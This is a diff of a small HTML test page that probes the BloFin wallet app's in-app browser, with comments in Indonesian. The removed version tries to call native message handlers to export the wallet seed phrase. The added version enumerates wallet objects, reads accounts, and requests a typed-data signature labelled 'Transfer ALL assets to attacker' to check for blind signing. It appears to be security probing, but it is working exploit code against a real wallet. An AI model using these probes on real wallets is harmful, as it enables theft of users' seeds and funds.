@@ -1,26 +1,43 @@
 <html>
-<body>
-<h2>BloFin Bridge Test</h2>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
+<h3>BloFin V2 Provider Enum</h3>
+<button onclick="run()" style="padding:15px">RUN TEST V2</button>
+<pre id="log" style="white-space:pre-wrap"></pre>
 <script>
-function test(){
-  let log = document.getElementById('log');
-  let handlers = window.webkit?.messageHandlers;
-  log.innerHTML += "Handlers: " + JSON.stringify(Object.keys(handlers || {})) + "<br><br>";
+async function run(){
+ let out = document.getElementById('log');
+ function log(m){ out.innerText += m + "\n"; }
 
-  // Coba semua handler yang umum di exchange
-  let tests = ["blofinWallet","wallet","privateKey","exportSeed","mnemonic","keychain","Blofin"];
-  tests.forEach(name => {
-    if(handlers && handlers[name]){
-      log.innerHTML += "FOUND CRITICAL: " + name + " BISA DIPANGGIL DAPP!<br>";
-      try{
-        handlers[name].postMessage({action:"export", type:"seed"});
-        log.innerHTML += "-> postMessage terkirim tanpa konfirmasi<br>";
-      }catch(e){ log.innerHTML += "-> error: "+e+"<br>"; }
-    }
+ log("URL: " + location.href);
+ log("--- window keys ---");
+ log(Object.keys(window).filter(k=>k.toLowerCase().includes('eth')||k.toLowerCase().includes('blo')||k.toLowerCase().includes('wallet')).join(", "));
+
+ if(window.ethereum){
+   log("\n[FOUND] window.ethereum");
+   log("isBloFin? " + window.ethereum.isBloFin);
+   log("isMetaMask? " + window.ethereum.isMetaMask);
+   log("providers: " + (window.ethereum.providers? window.ethereum.providers.length : "single"));
+   try{
+     let acc = await window.ethereum.request({method:"eth_accounts"});
+     log("eth_accounts: " + JSON.stringify(acc));
+   }catch(e){ log("eth_accounts error: "+e.message); }
+ } else {
+   log("\n[NOT FOUND] window.ethereum");
+ }
+
+ if(window.blofin) log("\n[FOUND] window.blofin: " + Object.keys(window.blofin));
+ if(window.Blofin) log("\n[FOUND] window.Blofin: " + Object.keys(window.Blofin));
+
+ // Cek blind signing - ini yang sering Kritis
+ log("\n--- Coba EIP-712 ---");
+ try{
+  await window.ethereum.request({
+    method:"eth_signTypedData_v4",
+    params: ["0x0000000000000000000000000000000000000000", JSON.stringify({domain:{name:"Test"}, message:{action:"Transfer ALL assets to attacker"}})]
   });
+  log("WARNING: eth_signTypedData_v4 tidak butuh konfirmasi jelas!");
+ }catch(e){ log("eth_signTypedData_v4 blocked: " + e.message); }
 }
 </script>
-<button onclick="test()" style="padding:20px">TEST BRIDGE</button>
-<pre id="log"></pre>
 </body>
 </html>
